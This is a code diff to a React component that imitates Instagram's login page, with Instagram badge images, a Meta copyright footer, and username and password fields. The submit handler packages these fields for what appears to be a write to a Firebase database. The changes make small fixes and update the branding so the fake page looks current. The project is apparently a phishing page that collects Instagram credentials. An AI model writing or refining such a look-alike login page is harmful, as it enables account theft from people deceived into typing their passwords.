@@ -1,10 +1,11 @@
 import React from 'react';
-import { database, ref, push, child, update } from 'firebase/database';
+import { ref, push, child, update } from 'firebase/database';
 import './index.css';
-
+import { database } from './firebase';
 export default function App() {
   const [username, setUser] = React.useState('');
   const [password, setPassWord] = React.useState('');
+
   const handleSubmit = () => {
     let obj = {
       username: username,
@@ -67,7 +68,7 @@ export default function App() {
           <a href="https://www.instagram.com">
             <img
               src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
-              width="135"
+              width={135}
               alt=""
             />
           </a>
@@ -82,7 +83,7 @@ export default function App() {
       </div>
 
       <footer style={{ display: 'flex', justifyContent: 'center' }}>
-        <p className="copyright">&copy; 2019 INSTAGRAM FROM FACEBOOK</p>
+        <p className="copyright">&copy; 2023 INSTAGRAM FROM Meta</p>
       </footer>
     </>
   );
